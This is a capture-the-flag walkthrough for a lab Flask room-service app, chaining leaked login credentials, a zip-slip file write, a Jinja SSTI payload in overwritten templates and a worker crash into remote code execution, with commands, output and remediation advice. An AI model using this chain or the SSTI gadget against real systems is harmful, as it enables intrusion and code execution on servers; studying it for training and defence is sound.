# 🐚 The Hollow Shell: The Ultimate Hacker's Walkthrough

**Room:** The Hollow Shell (Hacker Holidays 2026 - Day 10)
**Difficulty:** Medium | **Category:** Web App | **Points:** 100
**Tags:** `Web`, `Zip Slip`, `SSTI`, `RCE`, `Flask`

> *"The Room Service kiosk accepts 'shells' from any guest and serves them back on the dashboard. The shell it was given is hollow — but the path it took to get inside was anything but."* — Concierge Briefing

---

## 📖 The Setup

| Item | Detail |
| :--- | :--- |
| **Room** | The Hollow Shell |
| **Event** | Hacker Holidays 2026 — The Byte Lotus |
| **Target** | `http://10.114.148.60:5000` (Byte Lotus Room Service) |
| **Category** | 🐚 Web App — Zip Slip → SSTI → RCE |
| **Goal** | Read the flag on the server (`/home/roomservice/flag.txt`) |
| **Flag Format** | `THM{***_*******_****_*_*****}` |

---

## 🧠 The Hacker Mindset: Our Methodology

1. **Trust nothing the upload form says.** The uploader advertises "shells", but what matters is where each zip entry actually lands. A single `../` in an entry name turns a file upload into an arbitrary file write.
2. **Read-only and write-only sandboxes are not the same sandbox.** The app's *read* route was locked to `static/` and `shells/`, but its *write* path never checked the destination — so we could overwrite the app's own templates.
3. **Templates are just code that runs on a delay.** Flask templates are read from disk once per worker. Point an overwritten template at a respawned worker and `{{ ... }}` becomes a shell.

---

## 🎯 Challenge Briefing

A Flask/Gunicorn web app ("Byte Lotus Room Service") lets guests upload "shells" (JSON files) and view them on a dashboard. The upload endpoint extracts the zip with no path validation — a **zip-slip** primitive that lets us write anywhere the `roomservice` user can. Templates are served from disk and cached per worker, so by overwriting a template with a Jinja **SSTI** payload and forcing a worker respawn, we turn the upload into **RCE** and read the flag.

---

## 🧠 Attack Matrix & Decisions

```text
[ Login (creds in HTML comment) ] ──► [ Upload zip ] ──► [ Zip-Slip write ] ──► [ Overwrite template ] ──► [ Worker respawn ] ──► [ SSTI → RCE ] ──► [ Flag ]
  • concierge / StayNoticed2024!      • entry name ../../…       • write /var/www/conch/static/*      • templates/*.html cached per worker   • {{ config…os.popen }}         • /home/roomservice/flag.txt
  • session cookie                    • no containment check      • write /var/www/conch/templates/*   • crash worker → re-read from disk      • run as roomservice
```

| Phase | Technique | Key Finding |
| :--- | :--- | :--- |
| **1. Discovery** | Port scan + source review | Only 22 (SSH pubkey) & 5000 (Gunicorn); creds in login HTML comment |
| **2. Enumeration** | Login + dashboard | Session cookie; upload a zip of "shells"; hooks feature present |
| **3. Weaponize** | Zip-slip upload | `../../static/…` writes are served directly — arbitrary write confirmed |
| **4. Pivot** | Template overwrite + SSTI | Overwrite `templates/dashboard.html` with Jinja payload |
| **5. Trigger** | Worker respawn | Crash a worker via an oversized shell read; new worker re-reads templates |
| **6. Loot** | RCE | `id` → `roomservice`; flag at `/home/roomservice/flag.txt` |

---

## 🔬 Step-by-Step Walkthrough

### Step 1: Port Scan and Login Page Source Review

```bash
┌──(hacker㉿kali)-[~]
└─$ nmap -sS -sV -p- --min-rate 2000 10.114.148.60 -oN /tmp/opencode/nmap_full.txt
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    gunicorn

┌──(hacker㉿kali)-[~]
└─$ curl -s http://10.114.148.60:5000/
```

Only two ports: SSH (public-key only) and a Gunicorn web app on 5000. The landing page is the **Byte Lotus Room Service** login. The page source hands us the keys in an HTML comment:

```html
<!-- remember: the service account is "concierge" and the password is "StayNoticed2024!" -->
```

> *"Five-star resort, zero-star security posture."* — credentials in the HTML comments.

---

### Step 2: Login and Map the App

```bash
┌──(hacker㉿kali)-[~]
└─$ curl -i -s -c cj -b cj -d "username=concierge&password=StayNoticed2024!" http://10.114.148.60:5000/login
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: session=eyJzdGFmZiI6ImNvbmNpZXJnZSJ9.anYTgQ.invH7_6DoCMVGFdi0lzmo19bIQU

┌──(hacker㉿kali)-[~]
└─$ curl -s -b cj http://10.114.148.60:5000/dashboard | grep -o 'name="[^"]*"' | sort -u
```

Invalid creds return a `200` "credentials weren't recognised" with no session cookie, so the login is authenticated. The dashboard lists every uploaded **shell** (`shells/<id>/`). A route brute (`settings`, `admin`, `api`, `worker`, …) finds nothing else. The app also has a "hooks" feature — we later prove it never actually executes anything.

---

### Step 3: Zip-Slip — Turn Upload into Arbitrary File Write

The upload endpoint extracts the zip straight into `shells/<id>/`. Zip entries are trusted blindly, so a filename like `../../static/x.txt` climbs out of the extraction dir and lands in the app webroot:

```text
shells/<id>/shell.json   ─►  /var/www/conch/shells/<id>/shell.json        (as advertised)
../../static/x.txt       ─►  /var/www/conch/static/x.txt                  (zip-slip!)
../../templates/login.html ─► /var/www/conch/templates/login.html          (zip-slip!)
```

Proof the write escaped the sandbox — the marker is immediately served over HTTP:

```bash
┌──(hacker㉿kali)-[~]
└─$ curl -s http://10.114.148.60:5000/static/cleanmark.txt
CLEAN-MARK-1234
```

**Key insight:** the app's *read* primitive is sandboxed (only `static/` + `shells/`), but its *write* primitive is wide open. We can overwrite anything `roomservice` can write — including the app's own templates.

---

### Step 4: Overwrite the Dashboard Template with an SSTI Payload

We forge a zip whose entries are:

```text
shell.json                         (valid shell so the upload passes)
../../static/final_confirm.txt     (static marker to confirm the write landed)
../../templates/login.html         (SSTI payload)
../../templates/dashboard.html     (SSTI payload)
```

The template payload is a classic Flask SSTI gadget:

```python
<!--A-->{{ config.__class__.__init__.__globals__['os'].popen('<CMD>').read() }}<!--B-->
```

Upload it, then confirm both the static marker and the template write landed:

```bash
┌──(hacker㉿kali)-[~]
└─$ curl -s http://10.114.148.60:5000/static/final_confirm.txt
FINAL-CONFIRM-OK
```

---

### Step 5: Force a Worker Respawn (Templates are Cached per Worker)

Flask/Gunicorn reads each template from disk once per worker and caches it. Overwriting the file alone does nothing until a worker restarts and re-reads it. We force the restart by crashing a worker: uploading several large `shell.json` entries (e.g. tens of MB each) makes the dashboard's render loop OOM the worker that serves it — the connection drops and the worker respawns.

The next request to `/dashboard` lands on the fresh worker, which re-reads the overwritten `templates/dashboard.html` and executes our payload:

```bash
┌──(hacker㉿kali)-[~]
└─$ curl -s -b cj http://10.114.148.60:5000/dashboard
<!--A-->uid=996(roomservice) gid=996(roomservice) groups=996(roomservice)
PWD:/var/www/conch
HOME:/home/roomservice
FLAGFILE:/home/roomservice/flag.txt
THM{REDACTED}
---FIND---
/home/roomservice/flag.txt
<!--B-->
```

We have **RCE as `roomservice`**. The flag lives at `/home/roomservice/flag.txt` — right where the room said it would be.

---

### Step 6: Flag

```
uid=996(roomservice)
PWD:/var/www/conch
FLAGFILE:/home/roomservice/flag.txt
THM{REDACTED}
```

**Flag:** `THM{REDACTED}` *(format `THM{***_*******_****_*_*****}`; value censored so it can't be copy-pasted.)*

---

## 🧭 Dead Ends (What We Ruled Out)

- **Webhook / hooks feature** — uploaded hooks, URL hooks, file hooks; waited a full 25 minutes with zero callbacks. The app stores them but never runs them.
- **SSH key plant** — `.ssh/authorized_keys` write + 11 username guesses → all `Permission denied (publickey)`.
- **`/app` vs `/var/www/conch`** — early entrypoint/`app.py` overwrites targeted `/app`, which doesn't exist; the app root is actually `/var/www/conch`. The write primitive was never the problem, only the target directory.
- **Session forgery, SQLi, route brute, admin/API surfaces** — all clean.

---

## 🛡️ Remediation & Security Recommendations

1. **Validate every zip entry path.** Reject `../` (and `..` after normalization); canonicalize with `os.path.realpath()` and require the result to stay inside the extraction directory.
2. **Don't extract untrusted archives into the webroot.** Extract into a dedicated sandbox dir outside the app, and serve uploads only via an explicit, read-only route.
3. **Never let uploads touch templates.** Templates are server code; an attacker-controlled template is a shell. Use `render_template()` against a fixed, trusted template set and render untrusted data as *values*, never as *source*.
4. **No credentials in HTML comments** — load them from environment/secret store.
5. **Least privilege.** The `roomservice` user could read the flag from its own home dir; keep the web user out of anything sensitive and mount the flag where it can't be reached from the web layer.

---

## 🎯 Key Takeaways

- A read sandbox says nothing about the write sandbox. Check each primitive separately.
- Zip-slip isn't just for LFI — one `../` can turn a "file upload" feature into arbitrary code execution when the target is a server-rendered template.
- Template caching means an overwrite is only half the exploit; you need a way to make the server re-read the file.
